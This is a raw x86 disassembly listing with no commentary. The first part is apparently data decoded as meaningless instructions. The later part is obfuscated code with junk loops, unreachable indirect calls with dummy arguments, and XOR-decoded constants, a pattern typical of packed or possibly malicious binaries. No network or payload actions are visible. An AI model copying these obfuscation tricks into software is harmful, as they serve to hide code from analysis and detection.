  41195d:	push   edx
  41195e:	cmp    al,0x69
  411960:	sti    
  411961:	aas    
  411962:	xor    DWORD PTR [ebx+edx*4],ecx
  411965:	cli    
  411966:	pop    ebp
  411967:	mov    ebx,0xda4823d2
  41196c:	mov    ?,WORD PTR [edx]
  41196e:	jne    0x411935
  411970:	test   al,0x8d
  411972:	int3   
  411973:	and    DWORD PTR [edx-0x3a],ebp
  411976:	mov    al,ds:0x7a6add73
  41197b:	outs   dx,DWORD PTR ds:[esi]
  41197c:	in     eax,dx
  41197d:	push   ss
  41197e:	mov    dh,0xdf
  411980:	iret   
  411981:	jno    0x4119b1
  411983:	xchg   ebx,eax
  411984:	scas   eax,DWORD PTR es:[edi]
  411985:	adc    edx,ebx
  411987:	and    al,0xc
  411989:	sbb    dh,BYTE PTR [edi-0x1a3b6e1e]
  41198f:	inc    ecx
  411990:	sub    DWORD PTR [edi+0x4c],esp
  411993:	popf   
  411994:	sbb    eax,0xec631c73
  411999:	adc    esi,ebp
  41199b:	xor    edx,DWORD PTR [edx+0x641a113d]
  4119a1:	push   esi
  4119a2:	push   ss
  4119a3:	lods   eax,DWORD PTR ds:[esi]
  4119a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119a5:	inc    ebx
  4119a6:	arpl   WORD PTR [edi+0x60],sp
  4119a9:	xor    edi,0xf4ec1524
  4119af:	mov    ah,0xf9
  4119b1:	push   cs
  4119b2:	out    0xc0,eax
  4119b4:	sub    BYTE PTR [esi],0x5c
  4119b7:	sub    BYTE PTR [ebp-0x1c],ch
  4119ba:	sbb    al,0x77
  4119bc:	cld    
  4119bd:	mov    WORD PTR [edx],di
  4119c0:	xor    DWORD PTR ds:0x39ab21c,eax
  4119c6:	jne    0x41194d
  4119c8:	mov    al,ds:0x2c391739
  4119cd:	ret    0xcc7f
  4119d0:	out    dx,al
  4119d1:	ret    0xed06
  4119d4:	mov    al,0x3f
  4119d6:	mov    DWORD PTR [edx-0x4e22c7ef],esp
  4119dc:	xchg   edi,eax
  4119dd:	push   edx
  4119de:	cdq    
  4119df:	popa   
  4119e0:	pop    eax
  4119e1:	in     eax,dx
  4119e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119e3:	xor    DWORD PTR [esi+ecx*1],ebx
  4119e6:	repz jle 0x4119e8
  4119e9:	cmp    al,0x4a
  4119eb:	ins    BYTE PTR es:[edi],dx
  4119ec:	and    BYTE PTR [eax],ch
  4119ee:	and    eax,0x38338d67
  4119f3:	cwde   
  4119f4:	pop    DWORD PTR [eax-0x41d5efee]
  4119fa:	out    dx,eax
  4119fb:	stc    
  4119fc:	(bad)  
  4119fd:	enter  0x5a2a,0xc2
  411a01:	xor    bl,0x97
  411a04:	imul   eax,DWORD PTR [edi],0xa9d85c08
  411a0a:	cmp    DWORD PTR [ecx+ebp*1+0x34],esp
  411a0e:	rcl    BYTE PTR [edx+eax*1-0x73],1
  411a12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a13:	shl    BYTE PTR [ebp+0x15f05a49],cl
  411a19:	jb     0x411a0e
  411a1b:	and    ah,BYTE PTR [edx]
  411a1d:	cmp    al,0x86
  411a1f:	out    dx,eax
  411a20:	mov    DWORD PTR [ebx],ecx
  411a22:	mov    ecx,0xae0e106a
  411a27:	in     eax,dx
  411a28:	xchg   esp,eax
  411a29:	(bad)  
  411a2a:	xor    bh,BYTE PTR ds:0x799a48ea
  411a30:	xor    eax,0x896650e8
  411a35:	leave  
  411a36:	jg     0x411a32
  411a38:	fst    DWORD PTR [edi-0x6b]
  411a3b:	push   esp
  411a3c:	lods   al,BYTE PTR ds:[esi]
  411a3d:	xor    al,0x2c
  411a3f:	xor    ah,BYTE PTR [edi-0x2059ad39]
  411a45:	mov    esi,0x37fcc945
  411a4a:	mov    eax,0x6819b1e3
  411a4f:	fnstcw WORD PTR [ebp+esi*4+0x23]
  411a53:	aad    0x3e
  411a55:	adc    BYTE PTR [edi],bl
  411a57:	mov    ch,0x9e
  411a59:	dec    esi
  411a5a:	mov    edx,0xb8e7bfae
  411a5f:	push   edx
  411a60:	fld    QWORD PTR [eax+edx*8]
  411a63:	sub    eax,ebx
  411a65:	mov    ?,WORD PTR [ecx+0x47]
  411a68:	cmp    eax,0x22217a61
  411a6d:	mov    WORD PTR [edi],cs
  411a6f:	pop    edx
  411a70:	std    
  411a71:	mov    ebp,0x69fca809
  411a76:	pop    ebp
  411a77:	push   0x8bb23c0a
  411a7c:	(bad)  
  411a7d:	jmp    0xeaf4:0xd6fd09b0
  411a84:	fcompp 
  411a86:	add    BYTE PTR [ebp-0x65e9890],ah
  411a8c:	das    
  411a8d:	(bad)  
  411a8e:	mov    ds:0x8ba5f6be,al
  411a93:	adc    eax,0x3ad7e556
  411a98:	es js  0x411a51
  411a9b:	jg     0x411aea
  411a9d:	int    0xe5
  411a9f:	mov    ah,0x50
  411aa1:	mov    esp,0xd7f32eef
  411aa6:	rcr    DWORD PTR [ebx-0x5e38d473],1
  411aac:	mov    ah,0xb1
  411aae:	je     0x411af6
  411ab0:	sub    DWORD PTR [ecx],esp
  411ab2:	push   edi
  411ab3:	fwait
  411ab4:	push   ebp
  411ab5:	cmp    BYTE PTR [eax-0x63],dl
  411ab8:	fcom   DWORD PTR [ebx+0x51b98fac]
  411abe:	mov    cl,0x6f
  411ac0:	xor    al,0x61
  411ac2:	imul   esi,DWORD PTR [ecx],0xffffffd4
  411ac5:	mov    ebx,0x49ef7fc9
  411aca:	cs cmp edx,ebp
  411acd:	out    dx,eax
  411ace:	stos   BYTE PTR es:[edi],al
  411acf:	(bad)  
  411ad1:	dec    eax
  411ad2:	ss dec eax
  411ad4:	and    eax,0x1a11e7ed
  411ad9:	out    0xcc,eax
  411adb:	shr    BYTE PTR [edi+0x5936597a],cl
  411ae1:	add    eax,0x7f71be72
  411ae6:	and    DWORD PTR [esi-0x10aab8b],ebx
  411aec:	mov    ds:0x46d9534c,al
  411af1:	dec    eax
  411af2:	jg     0x411b0b
  411af4:	add    ecx,DWORD PTR [edi+0x5e6cccc6]
  411afa:	xchg   ecx,eax
  411afb:	ins    DWORD PTR es:[edi],dx
  411afc:	cs scas al,BYTE PTR es:[edi]
  411afe:	jo     0x411ac4
  411b00:	out    dx,eax
  411b01:	imul   esp,DWORD PTR [esi],0x5112fd60
  411b07:	call   0x92a77908
  411b0c:	add    al,0x1
  411b0e:	adc    BYTE PTR [ebx-0x40],bh
  411b11:	xchg   esi,eax
  411b12:	fisubr WORD PTR [edx-0x1a]
  411b15:	fnclex 
  411b17:	xchg   esi,eax
  411b18:	ret    0x8170
  411b1b:	inc    esi
  411b1c:	jo     0x411b83
  411b1e:	jns    0x411b77
  411b20:	push   eax
  411b21:	stc    
  411b22:	sbb    edx,edx
  411b24:	stc    
  411b25:	pop    ds
  411b26:	clc    
  411b27:	and    edx,ebx
  411b29:	xor    ch,0xb
  411b2c:	fcomip st,st(3)
  411b2e:	(bad)  
  411b2f:	sbb    al,dl
  411b31:	mov    dl,0x40
  411b33:	test   eax,0xb6a3d5b
  411b38:	inc    eax
  411b39:	and    ebp,DWORD PTR [edi+0x3a757e7b]
  411b3f:	mov    al,ds:0x45819487
  411b44:	popa   
  411b45:	jecxz  0x411ae1
  411b47:	call   0xb6a08b2f
  411b4c:	jmp    0xfc49:0x27479402
  411b53:	cwde   
  411b54:	xchg   DWORD PTR [edi+0x4d727a1c],eax
  411b5a:	cmp    ah,dl
  411b5c:	call   0xcd13:0x13dd9f30
  411b63:	dec    ebx
  411b64:	and    eax,edi
  411b66:	add    DWORD PTR [ebx-0x66],0xa0aa99e9
  411b6d:	xor    eax,0xa3a85847
  411b72:	ins    DWORD PTR es:[edi],dx
  411b73:	ins    DWORD PTR es:[edi],dx
  411b74:	sbb    esi,ecx
  411b76:	stos   BYTE PTR es:[edi],al
  411b77:	cmp    eax,0xaaedee72
  411b7c:	mov    ds:0xd73fb1c1,eax
  411b81:	cmc    
  411b82:	or     ebp,ecx
  411b84:	mov    ds:0x58c3661a,eax
  411b89:	mov    BYTE PTR [edx],dl
  411b8b:	fnstenv [ebx]
  411b8d:	mov    ebp,0xc4c090f
  411b92:	dec    esp
  411b93:	mov    gs,WORD PTR ds:0x7c323496
  411b99:	test   eax,0x3df7495a
  411b9e:	inc    esi
  411b9f:	or     eax,0x180480bf
  411ba4:	sbb    BYTE PTR [esi+0x685e46b6],dh
  411baa:	jno    0x411ba4
  411bac:	fnclex 
  411bae:	inc    ebp
  411baf:	mul    ah
  411bb1:	scas   al,BYTE PTR es:[edi]
  411bb2:	xchg   esp,eax
  411bb3:	rcl    BYTE PTR [edx-0xa],1
  411bb6:	jg     0x411c19
  411bb8:	pop    eax
  411bb9:	dec    ebx
  411bba:	stos   BYTE PTR es:[edi],al
  411bbb:	or     BYTE PTR [edi],dh
  411bbd:	dec    edx
  411bbe:	dec    edx
  411bbf:	cld    
  411bc0:	mov    DWORD PTR [ebx+ebx*8],esp
  411bc3:	push   esp
  411bc4:	pop    ebp
  411bc5:	pop    ds
  411bc6:	xchg   esi,eax
  411bc7:	ds inc ebp
  411bc9:	das    
  411bca:	cmp    al,0xe5
  411bcc:	popf   
  411bcd:	or     BYTE PTR ds:[esi-0x6b],dh
  411bd1:	inc    edi
  411bd2:	adc    BYTE PTR [esi+0x62465ae7],bh
  411bd8:	cmp    al,0x1c
  411bda:	stos   BYTE PTR es:[edi],al
  411bdb:	sub    DWORD PTR [ecx],ecx
  411bdd:	fwait
  411bde:	mov    cl,0x94
  411be0:	dec    ecx
  411be1:	mov    BYTE PTR [ecx],ch
  411be3:	inc    DWORD PTR ds:0x8692861d
  411be9:	xchg   ecx,eax
  411bea:	inc    esi
  411beb:	mov    WORD PTR [edi],?
  411bed:	push   ss
  411bee:	std    
  411bef:	mov    esi,DWORD PTR [ebp+0x10]
  411bf2:	mov    DWORD PTR [esi+0x8],eax
  411bf5:	mov    eax,DWORD PTR [ebp+0x18]
  411bf8:	mov    esi,DWORD PTR [ebp+0x10]
  411bfb:	mov    DWORD PTR [esi+0xc],eax
  411bfe:	mov    eax,DWORD PTR [ebp+0x1c]
  411c01:	mov    esi,DWORD PTR [ebp+0x10]
  411c04:	mov    DWORD PTR [esi+0x10],eax
  411c07:	mov    eax,DWORD PTR [ebp+0x8]
  411c0a:	xor    eax,ecx
  411c0c:	add    eax,edx
  411c0e:	pop    esi
  411c0f:	leave  
  411c10:	ret    0x18
  411c13:	push   ebp
  411c14:	mov    ebp,esp
  411c16:	sub    esp,0x9c
  411c1c:	mov    ecx,DWORD PTR [ebp+0x8]
  411c1f:	sbb    DWORD PTR ds:0x426f29,edi
  411c25:	mov    eax,0x8a9d
  411c2a:	adc    DWORD PTR ds:0x426eb5,0x24b2
  411c34:	xor    ax,WORD PTR [ecx+0x20]
  411c38:	mov    DWORD PTR ds:0x426f0d,0x19
  411c42:	cmp    DWORD PTR ds:0x426f0d,0x0
  411c49:	je     0x411c79
  411c4f:	cmp    DWORD PTR ds:0x426f0d,0x23
  411c56:	jge    0x411c79
  411c5c:	jmp    0x411c67
  411c61:	call   DWORD PTR ds:0x430a00
  411c67:	mov    ecx,DWORD PTR ds:0x426f0d
  411c6d:	dec    ecx
  411c6e:	mov    DWORD PTR ds:0x426f0d,ecx
  411c74:	jmp    0x411c42
  411c79:	mov    ecx,0x3b5f
  411c7e:	add    ax,cx
  411c81:	mov    DWORD PTR ds:0x426e85,0x19
  411c8b:	cmp    DWORD PTR ds:0x426e85,0x0
  411c92:	je     0x411ce1
  411c98:	cmp    DWORD PTR ds:0x426e85,0xc
  411c9f:	jg     0x411ce1
  411ca5:	jmp    0x411cb3
  411caa:	push   DWORD PTR [ebp-0x10]
  411cad:	call   DWORD PTR ds:0x430a3c
  411cb3:	cmp    DWORD PTR ds:0x426e85,0xd
  411cba:	jne    0x411ccf
  411cc0:	xor    ecx,ecx
  411cc2:	or     ecx,DWORD PTR ds:0x426e85
  411cc8:	dec    ecx
  411cc9:	mov    DWORD PTR ds:0x426e85,ecx
  411ccf:	mov    ecx,DWORD PTR ds:0x426e85
  411cd5:	dec    ecx
  411cd6:	mov    DWORD PTR ds:0x426e85,ecx
  411cdc:	jmp    0x411c8b
  411ce1:	movzx  eax,ax
  411ce4:	mov    ecx,DWORD PTR ds:0x426f25
  411cea:	sub    DWORD PTR ds:0x426e89,ecx
  411cf0:	mov    DWORD PTR [ebp-0x10],eax
  411cf3:	mov    BYTE PTR [ebp-0x1],0x7a
  411cf7:	lea    eax,[ebp-0x1]
  411cfa:	mov    DWORD PTR [ebp-0xc],eax
  411cfd:	mov    al,BYTE PTR [ebp-0x1]
  411d00:	mov    ecx,DWORD PTR [ebp-0xc]
  411d03:	xor    al,0x81
  411d05:	sub    DWORD PTR ds:0x426f2d,0x318c
  411d0f:	add    al,0x6
  411d11:	sub    DWORD PTR ds:0x426ef5,0x54d2
  411d1b:	mov    BYTE PTR [ecx],al
  411d1d:	and    eax,eax
  411d1f:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411d26:	push   ebx
  411d27:	and    DWORD PTR ds:0x426e8d,0x0
  411d31:	mov    ecx,DWORD PTR ds:0x426e8d
  411d37:	inc    ecx
  411d38:	mov    DWORD PTR ds:0x426e8d,ecx
  411d3e:	cmp    DWORD PTR ds:0x426e8d,0x22
  411d45:	jg     0x411d8e
  411d4b:	jmp    0x411d81
  411d50:	push   0x70b5
  411d55:	push   0x7924
  411d5a:	push   0x4ec8
  411d5f:	push   0x56ca
  411d64:	push   0x88b0
  411d69:	push   0x70c2
  411d6e:	push   0x4f11
  411d73:	push   DWORD PTR [ebp-0x1c]
  411d76:	push   0x827e
  411d7b:	call   DWORD PTR ds:0x430a04
  411d81:	cmp    DWORD PTR ds:0x426e8d,0x18
  411d88:	jb     0x411d31
  411d8e:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  411d95:	and    DWORD PTR ds:0x426ee1,0x0
  411d9f:	jmp    0x411daf
  411da4:	mov    eax,ds:0x426ee1
  411da9:	inc    eax
  411daa:	mov    ds:0x426ee1,eax
  411daf:	cmp    DWORD PTR ds:0x426ee1,0x10
  411db6:	jae    0x411e0b
  411dbc:	cmp    DWORD PTR ds:0x426ee1,0x6
  411dc3:	jb     0x411e0b
  411dc9:	jmp    0x411dee
  411dce:	push   0x426ebd
  411dd3:	push   0x863e
  411dd8:	push   DWORD PTR [ebp-0x14]
  411ddb:	push   DWORD PTR [ebp-0x28]
  411dde:	push   0x80d0
  411de3:	push   0x79b2
  411de8:	call   DWORD PTR ds:0x430a40
  411dee:	cmp    DWORD PTR ds:0x426ee1,0x5
  411df5:	jne    0x411e06
  411dfb:	mov    eax,ds:0x426ee1
  411e00:	inc    eax
  411e01:	mov    ds:0x426ee1,eax
  411e06:	jmp    0x411da4
  411e0b:	mov    ecx,DWORD PTR [ebp-0x18]
  411e0e:	push   esi
  411e0f:	mov    eax,0x75108b3
  411e14:	xor    ecx,eax
  411e16:	mov    esi,0x3272fa
  411e1b:	push   edi
  411e1c:	add    ecx,esi
  411e1e:	jmp    0x411e3e
  411e23:	not    DWORD PTR ds:0x426ea5
  411e29:	mov    dl,BYTE PTR [ebp-0x1]
  411e2c:	mov    DWORD PTR ds:0x426f25,0x1eab
  411e36:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  411e3d:	inc    ecx
  411e3e:	mov    DWORD PTR ds:0x426ee1,0x6456
  411e48:	cmp    ecx,0x40
  411e4b:	mov    DWORD PTR ds:0x426ea9,0x5cb
  411e55:	jb     0x411e23
  411e5b:	sub    DWORD PTR ds:0x426ec5,0x4698
  411e65:	mov    edx,DWORD PTR [ebp-0x18]
  411e68:	xor    edx,eax
  411e6a:	add    edx,esi
  411e6c:	mov    DWORD PTR ds:0x426ea9,0x4896
  411e76:	jmp    0x411f44
  411e7b:	mov    edi,DWORD PTR [ebp+0x8]
  411e7e:	and    DWORD PTR ds:0x426e9d,0x0
  411e88:	jmp    0x411e9a
  411e8d:	mov    ecx,DWORD PTR ds:0x426e9d
  411e93:	inc    ecx
  411e94:	mov    DWORD PTR ds:0x426e9d,ecx
  411e9a:	cmp    DWORD PTR ds:0x426e9d,0x12
  411ea1:	jae    0x411ec4
  411ea7:	cmp    DWORD PTR ds:0x426e9d,0x1f
  411eae:	jg     0x411ec4
  411eb4:	jmp    0x411ebf
  411eb9:	call   DWORD PTR ds:0x430a08
  411ebf:	jmp    0x411e8d
  411ec4:	mov    ecx,0x8a9d
  411ec9:	add    DWORD PTR ds:0x426f1d,0x3bc7
  411ed3:	xor    cx,WORD PTR [edi+edx*4+0x2]
  411ed8:	mov    edi,0x3b5f
  411edd:	or     DWORD PTR ds:0x426ec9,0x426e8d
  411ee7:	add    cx,di
  411eea:	movzx  ecx,cx
  411eed:	mov    DWORD PTR [ebp-0xc],ecx
  411ef0:	mov    ecx,DWORD PTR ds:0x426ee9
  411ef6:	sub    ecx,DWORD PTR ds:0x426e99
  411efc:	mov    DWORD PTR ds:0x426ee9,ecx
  411f02:	mov    ecx,DWORD PTR [ebp+0x8]
  411f05:	or     DWORD PTR ds:0x426f2d,0x426e89
  411f0f:	movzx  ecx,WORD PTR [ecx+edx*4]
  411f13:	adc    DWORD PTR ds:0x426ebd,0x426ef1
  411f1d:	xor    ecx,0x8a9d
  411f23:	xor    DWORD PTR ds:0x426ef5,0x426e95
  411f2d:	add    ecx,edi
  411f2f:	mov    edi,DWORD PTR [ebp-0xc]
  411f32:	mov    DWORD PTR ds:0x426f09,0x3565
  411f3c:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  411f43:	inc    edx
  411f44:	mov    ecx,0x1c2a
  411f49:	mov    ecx,DWORD PTR [ebp-0x10]
  411f4c:	cmp    edx,ecx
  411f4e:	jne    0x411e7b
  411f54:	sub    edx,0x34ee
  411f5a:	mov    ecx,DWORD PTR [ebp-0x18]
  411f5d:	xor    DWORD PTR ds:0x426ef9,ecx
  411f63:	mov    edx,DWORD PTR [ebp+0x10]
  411f66:	mov    DWORD PTR ds:0x426ec5,0x17
  411f70:	cmp    DWORD PTR ds:0x426ec5,0x0
  411f77:	je     0x411fcf
  411f7d:	cmp    DWORD PTR ds:0x426ec5,0x2
  411f84:	jl     0x411fcf
  411f8a:	jmp    0x411f9f
  411f8f:	push   0x4ca2
  411f94:	push   0x426035
  411f99:	call   DWORD PTR ds:0x430a44
  411f9f:	cmp    DWORD PTR ds:0x426ec5,0x3
  411fa6:	jne    0x411fbb
  411fac:	xor    edi,edi
  411fae:	xor    edi,DWORD PTR ds:0x426ec5
  411fb4:	dec    edi
  411fb5:	mov    DWORD PTR ds:0x426ec5,edi
  411fbb:	xor    edi,edi
  411fbd:	add    edi,DWORD PTR ds:0x426ec5
  411fc3:	dec    edi
  411fc4:	mov    DWORD PTR ds:0x426ec5,edi
  411fca:	jmp    0x411f70
  411fcf:	xor    ecx,eax
  411fd1:	mov    DWORD PTR ds:0x426f21,0x1d
  411fdb:	cmp    DWORD PTR ds:0x426f21,0x0
  411fe2:	je     0x41201c
  411fe8:	cmp    DWORD PTR ds:0x426f21,0x2c
  411fef:	jg     0x41201c
  411ff5:	jmp    0x41200a
  411ffa:	push   0x426ed5
  411fff:	push   0x3809
  412004:	call   DWORD PTR ds:0x430a48
  41200a:	mov    edi,DWORD PTR ds:0x426f21
  412010:	dec    edi
  412011:	mov    DWORD PTR ds:0x426f21,edi
  412017:	jmp    0x411fdb
  41201c:	add    ecx,esi
  41201e:	xor    edi,DWORD PTR ds:0x426ea9
  412024:	mov    DWORD PTR [edx],ecx
  412026:	mov    ecx,DWORD PTR [ebp-0x18]
  412029:	xor    ecx,eax
  41202b:	add    ecx,esi
  41202d:	and    edi,0x6cf8
  412033:	mov    DWORD PTR [ebp-0xc],ecx
  412036:	mov    DWORD PTR ds:0x426ea5,0x13
  412040:	cmp    DWORD PTR ds:0x426ea5,0x0
  412047:	je     0x41207a
  41204d:	cmp    DWORD PTR ds:0x426ea5,0x1f
  412054:	jge    0x41207a
  41205a:	jmp    0x412068
  41205f:	push   DWORD PTR [ebp-0x24]
  412062:	call   DWORD PTR ds:0x430a0c
  412068:	mov    edi,DWORD PTR ds:0x426ea5
  41206e:	dec    edi
  41206f:	mov    DWORD PTR ds:0x426ea5,edi
  412075:	jmp    0x412040
  41207a:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  412081:	mov    DWORD PTR ds:0x426ea9,0x18
  41208b:	cmp    DWORD PTR ds:0x426ea9,0x0
  412092:	je     0x4120ec
  412098:	cmp    DWORD PTR ds:0x426ea9,0xa
  41209f:	ja     0x4120ec
  4120a5:	jmp    0x4120c0
  4120aa:	push   DWORD PTR [ebp-0x28]
  4120ad:	push   0x4ee1
  4120b2:	push   DWORD PTR [ebp-0x20]
  4120b5:	push   0x56ea
  4120ba:	call   DWORD PTR ds:0x430a4c
  4120c0:	cmp    DWORD PTR ds:0x426ea9,0xb
  4120c7:	jne    0x4120da
  4120cd:	mov    ecx,DWORD PTR ds:0x426ea9
  4120d3:	dec    ecx
  4120d4:	mov    DWORD PTR ds:0x426ea9,ecx
  4120da:	mov    ecx,DWORD PTR ds:0x426ea9
  4120e0:	dec    ecx
  4120e1:	mov    DWORD PTR ds:0x426ea9,ecx
  4120e7:	jmp    0x41208b
  4120ec:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  4120f3:	adc    edi,edi
  4120f5:	mov    DWORD PTR [ebp-0x10],0xf89c95b5
  4120fc:	mov    ecx,DWORD PTR ds:0x426f19
  412102:	adc    DWORD PTR ds:0x426eb9,ecx
  412108:	mov    ecx,DWORD PTR [ebp-0x14]
  41210b:	movzx  edi,BYTE PTR ds:0x426ef5
  412112:	add    edi,DWORD PTR ds:0x426ed5
  412118:	mov    DWORD PTR ds:0x426ef5,edi
  41211e:	mov    DWORD PTR [ebp+0x8],ecx
  412121:	mov    ecx,DWORD PTR [ebp+0x8]
  412124:	mov    DWORD PTR ds:0x426eb1,0x11
  41212e:	cmp    DWORD PTR ds:0x426eb1,0x0
  412135:	je     0x4121a1
  41213b:	cmp    DWORD PTR ds:0x426eb1,0x9
  412142:	jl     0x4121a1
  412148:	jmp    0x412175
  41214d:	push   DWORD PTR [ebp-0x24]
  412150:	push   0x5b11
  412155:	push   0x5886
  41215a:	push   DWORD PTR [ebp-0xc]
  41215d:	push   DWORD PTR [ebp-0x28]
  412160:	push   0x128a
  412165:	push   0x1ff9
  41216a:	push   0x6625
  41216f:	call   DWORD PTR ds:0x430a10
  412175:	cmp    DWORD PTR ds:0x426eb1,0xa
  41217c:	jne    0x41218f
  412182:	mov    edi,DWORD PTR ds:0x426eb1
  412188:	dec    edi
  412189:	mov    DWORD PTR ds:0x426eb1,edi
  41218f:	mov    edi,DWORD PTR ds:0x426eb1
  412195:	dec    edi
  412196:	mov    DWORD PTR ds:0x426eb1,edi
  41219c:	jmp    0x41212e
  4121a1:	xor    ecx,eax
  4121a3:	and    DWORD PTR ds:0x426ebd,0x0
  4121ad:	jmp    0x4121bf
  4121b2:	mov    edi,DWORD PTR ds:0x426ebd
  4121b8:	inc    edi
  4121b9:	mov    DWORD PTR ds:0x426ebd,edi
  4121bf:	cmp    DWORD PTR ds:0x426ebd,0x14
  4121c6:	jae    0x4121e9
  4121cc:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4121d3:	jle    0x4121e9
  4121d9:	jmp    0x4121e4
  4121de:	call   DWORD PTR ds:0x430a14
  4121e4:	jmp    0x4121b2
  4121e9:	add    ecx,esi
  4121eb:	mov    edi,DWORD PTR ds:0x426ec9
  4121f1:	mov    ecx,0xf641bea
  4121f6:	mov    edi,0x5a1eade
  4121fb:	mov    DWORD PTR ds:0x426ed5,0x1d19
  412205:	je     0x416e72
  41220b:	and    DWORD PTR ds:0x426e95,0x0
  412215:	jmp    0x412229
  41221a:	xor    ebx,ebx
  41221c:	xor    ebx,DWORD PTR ds:0x426e95
  412222:	inc    ebx
  412223:	mov    DWORD PTR ds:0x426e95,ebx
  412229:	cmp    DWORD PTR ds:0x426e95,0x1f
  412230:	jae    0x41225c
  412236:	cmp    DWORD PTR ds:0x426e95,0x2f
  41223d:	jl     0x41225c
  412243:	jmp    0x412257
  412248:	push   DWORD PTR [ebp-0x18]
  41224b:	push   DWORD PTR [ebp-0x18]
  41224e:	push   DWORD PTR [ebp-0x10]
  412251:	call   DWORD PTR ds:0x430a18
  412257:	jmp    0x41221a
  41225c:	mov    edx,DWORD PTR [ebp+0x8]
  41225f:	mov    ebx,DWORD PTR ds:0x426ec5
  412265:	add    ebx,DWORD PTR ds:0x426ea1
  41226b:	mov    DWORD PTR ds:0x426ec5,ebx
  412271:	mov    ebx,DWORD PTR [ebp-0x8]
  412274:	xor    edx,eax
  412276:	sbb    DWORD PTR ds:0x426ea1,0x426edd
  412280:	xor    ebx,eax
  412282:	add    DWORD PTR ds:0x426e91,0x426ec5
  41228c:	sub    edx,ebx
  41228e:	sub    edx,esi
  412290:	sbb    DWORD PTR ds:0x426eb5,edi
  412296:	xor    edx,eax
  412298:	mov    DWORD PTR [ebp+0x8],edx
  41229b:	add    edx,0x4d69
  4122a1:	mov    edx,DWORD PTR [ebp+0x8]
  4122a4:	mov    ebx,DWORD PTR [ebp-0x58]
  4122a7:	lea    edx,[ebx+edx*1+0x5708f4]
  4122ae:	mov    DWORD PTR [ebp-0x58],edx
  4122b1:	mov    edx,DWORD PTR [ebp+0x8]
  4122b4:	xor    ebx,DWORD PTR ds:0x426f05
  4122ba:	mov    ebx,DWORD PTR [ebp-0x54]
  4122bd:	and    DWORD PTR ds:0x426f11,0x6a73
  4122c7:	add    edx,0x64f89a
  4122cd:	adc    DWORD PTR ds:0x426ea5,0x426ef1
  4122d7:	imul   edx,ebx
  4122da:	or     DWORD PTR ds:0x426eed,0x7801
  4122e4:	mov    DWORD PTR [ebp-0x54],edx
  4122e7:	and    DWORD PTR ds:0x426ea9,0x0
  4122f1:	mov    edx,DWORD PTR ds:0x426ea9
  4122f7:	inc    edx
  4122f8:	mov    DWORD PTR ds:0x426ea9,edx
  4122fe:	cmp    DWORD PTR ds:0x426ea9,0xa
  412305:	ja     0x41234d
  41230b:	jmp    0x412326
  412310:	push   DWORD PTR [ebp-0x18]
  412313:	push   0x70df
  412318:	push   DWORD PTR [ebp-0x28]
  41231b:	push   0x6818
  412320:	call   DWORD PTR ds:0x430a1c
  412326:	cmp    DWORD PTR ds:0x426ea9,0x9
  41232d:	jne    0x412340
  412333:	mov    edx,DWORD PTR ds:0x426ea9
  412339:	inc    edx
  41233a:	mov    DWORD PTR ds:0x426ea9,edx
  412340:	cmp    DWORD PTR ds:0x426ea9,0x1f
  412347:	jb     0x4122f1
  41234d:	mov    edx,DWORD PTR [ebp+0x8]
  412350:	movzx  ebx,WORD PTR ds:0x426ef1
  412357:	sub    DWORD PTR ds:0x426eb9,ebx
  41235d:	mov    ebx,DWORD PTR [ebp-0x50]
  412360:	add    edx,0x242ebe9
  412366:	sbb    DWORD PTR ds:0x426ef1,0x426ee1
  412370:	and    edx,ebx
  412372:	mov    DWORD PTR [ebp-0x50],edx
  412375:	xor    edx,edx
  412377:	or     edx,DWORD PTR ds:0x426ed1
  41237d:	adc    DWORD PTR ds:0x426ec5,edx
  412383:	mov    edx,DWORD PTR [ebp+0x8]
  412386:	and    DWORD PTR ds:0x426f09,0x423
  412390:	mov    ebx,DWORD PTR [ebp-0x4c]
  412393:	and    DWORD PTR ds:0x426ee1,0x67c7
  41239d:	add    edx,ecx
  41239f:	mov    DWORD PTR ds:0x426ee1,0x22dc
  4123a9:	or     edx,ebx
  4123ab:	and    DWORD PTR ds:0x426f2d,0x602a
  4123b5:	mov    DWORD PTR [ebp-0x4c],edx
  4123b8:	and    DWORD PTR ds:0x426e8d,edx
  4123be:	mov    edx,DWORD PTR [ebp+0x8]
  4123c1:	mov    DWORD PTR ds:0x426ee9,0x1e
  4123cb:	cmp    DWORD PTR ds:0x426ee9,0x0
  4123d2:	je     0x41241c
  4123d8:	cmp    DWORD PTR ds:0x426ee9,0xf
  4123df:	jl     0x41241c
  4123e5:	jmp    0x4123f0
  4123ea:	call   DWORD PTR ds:0x430a20
  4123f0:	cmp    DWORD PTR ds:0x426ee9,0x10
  4123f7:	jne    0x41240a
  4123fd:	mov    ebx,DWORD PTR ds:0x426ee9
  412403:	dec    ebx
  412404:	mov    DWORD PTR ds:0x426ee9,ebx
  41240a:	mov    ebx,DWORD PTR ds:0x426ee9
  412410:	dec    ebx
  412411:	mov    DWORD PTR ds:0x426ee9,ebx
  412417:	jmp    0x4123cb
  41241c:	mov    ebx,0xfdbe0321
  412421:	sub    ebx,edx
  412423:	sbb    edx,0x3018
  412429:	add    ebx,DWORD PTR [ebp-0x48]
  41242c:	sub    DWORD PTR ds:0x426e85,0x15fb
  412436:	mov    DWORD PTR [ebp-0x48],ebx
  412439:	mov    DWORD PTR ds:0x426f0d,0x10
  412443:	cmp    DWORD PTR ds:0x426f0d,0x0
  41244a:	je     0x4124a6
  412450:	cmp    DWORD PTR ds:0x426f0d,0x5
  412457:	jbe    0x4124a6
  41245d:	jmp    0x412478
  412462:	push   0x426000
  412467:	push   DWORD PTR [ebp-0x24]
  41246a:	push   DWORD PTR [ebp-0x14]
  41246d:	push   0x32fd
  412472:	call   DWORD PTR ds:0x430a24
  412478:	cmp    DWORD PTR ds:0x426f0d,0x6
  41247f:	jne    0x412494
  412485:	xor    ebx,ebx
  412487:	or     ebx,DWORD PTR ds:0x426f0d
  41248d:	dec    ebx
  41248e:	mov    DWORD PTR ds:0x426f0d,ebx
  412494:	mov    ebx,DWORD PTR ds:0x426f0d
  41249a:	dec    ebx
